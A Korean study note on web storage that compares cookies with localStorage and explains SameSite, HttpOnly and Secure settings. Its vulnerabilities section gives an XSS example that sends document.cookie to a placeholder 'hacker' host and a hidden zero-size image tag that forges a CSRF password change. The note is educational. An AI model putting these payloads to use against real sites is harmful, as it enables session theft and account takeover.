# 쿠키? 로컬스토리지?

## 🍪 쿠키

- 개념
  : 사용자의 웹 브라우저에 저장되는 작은 기록 정보 파일

  - 최대 4KB를 가진 매우 작은 양의 데이터로, 방문한 페이지를 저장하거나 유저의 `로그인 정보`를 저장하는 등 다양한 방법으로 사용됨.
  - 문자열(text)만 저장이 가능하다는 제한이 있음.
  - (key, value) 형태로 저장되어 있음.
  - 브라우저 전용 쿠키 저장소에 저장됨.

- 쿠키는 왜 사용하는걸까?

  - 사용자 경험을 높여주기 위해
  - HTTP의 stateless을 보완하기 위해 등장했음.
  - 쿠키를 활용해서 `서버`는 사용자의 브라우저에 데이터를 넣을 수 있음.
  - 반복적인 인증(stateless하기 때문에 서버는 클라이언트가 누구인지 계속 인증을 해주어야 하기 때문)을 피해 사용자 편의를 위한 기능을 제공하기 위해서 사용함.
  - 쿠키는 자동으로 모든 요청에 함께 담겨서 날아간다.

- 특징

  1. 쿠키는 브라우저 단위로 생성됨.
  2. 쿠키는 도메인에 따라 제한이 됨. `ex) youtube에서 생성한 쿠키는 youtube에만 보내짐.`

- 쿠키의 취약점

  1. XSS(Cross Site Scripting)

     - 사용자 브라우저에 스크립트를 실행시켜 정보를 탈취하거나 조작
     - `http://service.com?search=<script>location.href('http://hacker/cookie.php?value='+document.cookie);</script>`

  2. CSRF(Cross-Site Request Forgey)

     - 사용자가 자신의 의지와 무관하게 공격자가 의도한 행동을 하여 특정 웹 페이지를 보안에 취약하게 한다거나 수정, 삭제 등의 작업을 하게 만드는 공격 방법
     - 조작된 요청 정보가 삽인된 게시글을 클릭하면 사용자의 권한으로 의도하지 않은 조작된 요청을 웹 서버에 전송하도록 하여 게시판 설정 변경, 회원 정보 변경, 패스워드 변경 등의 행위가 발생
     - 서버에서 동격이 발생하며, 특정 사이트가 사용자의 브라우저를 신뢰한다는 점을 공격함.
     - 예시) 옥션, 1800만 명의 개인정보가 해킹
       ```
          1. 해커가 아래의 코드가 들어간 담긴 이메일을 보낸다. 이때 이미지의 크기가 0이므로 알지 못한다.
            <img src="http://auction.com/changeUserAcoount?id=admin&password=admin" width="0" height="0">
          2. 옥션 관리자 중 한명이 관리 권하는 가지고 회사 내에서 일을 하는 중 메일을 조회한다.(이때, 브라우저에는 옥션의 관리자 쿠키를 가지고 있다.)
          3. 메일을 열었을 때, 이미지 파일을 받아오기 위해 URL이 열린다.
          4. 해커가 원하는 대로 관리자의 계정의 id와 pw가 admin으로 변한다.
          5. 해커는 해당 아디이와 비밀번호로 로그인해 사용자의 다른 정보를 탈취한다.
       ```

  3. 스니핑
     - 패킷을 가로채 정보 도청 가능

- 어떻게 보안을 강화할 수 있을까?

  1. HTTP Only : JS를 통한 쿠키에 접근을 제한함.
  2. SameSite: 외부 서비스에서 우리 서비스의 데이터를 변경하는 요청을 보내지 못하게 만듦.
  3. Secure: HTTPS 연결을 통해서만 전송됨. 즉, 암호화 되어 전송

  ### 궁금증

  ```
  Q) youtube에서 생성한 쿠키는 youtube에만 보내진다고 했는데 그럼 CSRF에 안전한거 아닌가? 왜 SameSite설정을 해줘야하지?

  A) 쿠키에서 CSRF공격이 취약한 것은 쿠키에 담긴 액세스를 탈취해오기 때문이 아니라 통신 시 쿠키가 자동으로 서버로 같이 넘어가기 때문에 이를 통해 서버의 민감한 정보를 수정할 수 있기 때문임. 기본 설정은 `Lax`로 일부 예외(`HTTP GET method/a href/link href`)에서는 CSRF가 발생할 가능성이 있음. 그렇기 때문에 strict를 사용하는 것을 권장한다고 함. <br/> 예시로 들었던 옥션과 같은 사이트의 공격이 통하지 않게 됨.
  ```

- 퍼스트파티 쿠키? 서드파티쿠키?
  1. 퍼스트파티 쿠키
     - 사용자가 방문하는 웹 사이트에서 직접 생성되는 쿠키
     - 주로 사용자 경험을 향상시키기 위해 사용됨.
  2. 서드 파티 쿠키
     - 사용자가 방문한 웹 사이트가 아닌 다른 도메인에서 생성되는 쿠키
     - 주로 광고 네트워크나 소셜 미디어 플러그인 등 제3자가 생성함.
     - 사용자의 웹 활용을 추적해 맞춤형 광고를 제공하는데 사용됨.
     - 옥션에서 신발을 검색하면 쿠팡에서도 신발을 추천해주는 원리임.
     - 사용자 동의 없이 생성될 수 있음.
- SameSite 설정
  1. None: 크로스 사이트 요청의 경우에도 항상 전동 됨. 즉, 서드 파티 쿠키도 적용 됨.
  2. Strict: 가장 보수적인 정책, Strict로 설정된 쿠키는 크로스 사이트 요청에 전송되지 않음. 서드 파티 쿠키는 전송되지 않고 퍼스트 파티 쿠키만 전송됨.
  3. Lax: Strict에 비해 상대적으로 느슨한 정택. 몇가지 예외적인 요청에 서드 파티 쿠키가 전송됨.
  - 웹 페이지 이동과 "안전한"HTTP 메서드 요청의 경우 전송이 됨.
  - 웹 페이지 이동은 `window.location.replace`등으로의 이동 혹은 302다이렉트를 이용한 이동이 포함됨.
  - "안전한"메서드 요청은? GET처럼 서버의 상태를 바꾸지 않을 거라고 기대되는 요청에는 쿠키가 전송됨.(POST, DELETE와 같은 요청은 전송 안됨.)
  - 이전에는 samestie설정을 명시적으로 하지 않으면 none이였지만 2020년 2월 4일 크롬 80버전이 배포되면서 samesite의 기본 값이 Lax로 변경되었음. (firefox는 2020년 하반기에 적용, brave의 경우 Chromium 기반으로 개발된 브라우저로 동일하게 lax가 기본임.)

## 🖥 로컬스토리지

- 클라이언트측에서 데이터를 저장하는데 사용됨.
- 5MB이상의 데이터를 저장할 수 있어 비교적 큰 데이터도 저장가능
- 사용자의 브라우저에 데이터를 저장하는 방법 중 하나
- 웹 스토리지 DB에 저장됨.

- 쿠키와 다른 점이 뭘까?

  1. 모든 HTTP요청에 데이터를 주고 받을 필요가 없음.
  2. 문자열 뿐만 아니라 object도 저장이 가능함.
  3. 영구저장(수동 삭제 필요, 하지만 이는 쿠키에 만료시간이 있다고 가정했을 경우)

- 특징

  - 로컬스토리지 또한 도메인별로 저장됨.

- 로컬스토리지의 취약점

  - XSS 공격에 취약함.
  - 암호화가 되지 않음.
  - => 저장된 데이터의 위협 수준이 매우 낮아야 함.

- 로컬스토리지에는 주로 어떤 데이터가 저장이 될까?
  - 언어 설정
  - 팝업 설정 정보(ex. 일주일간 보지 않기)

### 궁금증

```
Q) 언어 설정과 팝업 설정 정보와 같은 데이터는 쿠키에 저장해도 되는거 아닌가?
A) 쿠키에 저장해도 무방하다. 하지만 쿠키의 저장소는 로컬스토리지보다 작으며 쿠키는 모든 HTTP요청에 포함되어 가므로 HTTP요청에 필요한 내용이 아니라면? 로컬스토리이지에 넣는 것이 좋을 것 같다.
```

## 결론

- 데이터 전달 방식: 쿠키는 HTTP요청에 자동으로 포함되지만 로컬 스토리지는 임의로 포함해야 포함됨.
- 생성 장소: 쿠키는 서버에서 생성, 로컬스토리지에는 클라이언트측에서 저장, 생성
- 브라우저 정책: 쿠키는 개인정보 보호 모드 시 자동 차단, 로컬스토리지는 동일 도메인에서 항상 접근 가능

---

[쿠키의 SameSite 설명1](https://web.dev/articles/samesite-cookies-explained?hl=ko) <br/>
[쿠키의 SameSite 설명2](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) <br/>
[노마드 코더:세선 vs 토큰 vs 쿠키](https://www.youtube.com/watch?v=tosLBcAX1vk&t=39s)
